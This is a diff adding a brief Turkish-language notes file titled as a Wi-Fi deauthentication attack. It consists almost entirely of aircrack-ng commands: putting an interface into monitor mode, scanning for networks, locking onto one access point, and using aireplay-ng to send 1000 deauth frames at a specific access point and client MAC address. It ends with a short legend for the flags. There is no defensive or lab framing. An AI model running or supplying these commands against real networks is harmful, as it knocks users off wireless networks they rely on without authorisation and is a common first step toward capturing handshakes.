@@ -1,0 +1,18 @@
+Wifi ağlarına yönelik saldırı ==> WifiDeauth saldırısı  	*
+								*
+*****************************************************************
+
+airmon-ng start wlan0
+
+airodump-ng wlan0mon
+
+airodump-ng --channel 5 --bssid 00:00:00:00:00 wlan0mon
+
+aireplay-ng --deauth 1000 -a 54:83:3A:4E:82:8D -c FC:87:43:4F:0D:24 wlan0mon
+
+
+-a ==> BSSID
+-c ==> STATION
+
+
+wifi deauth saldırısı
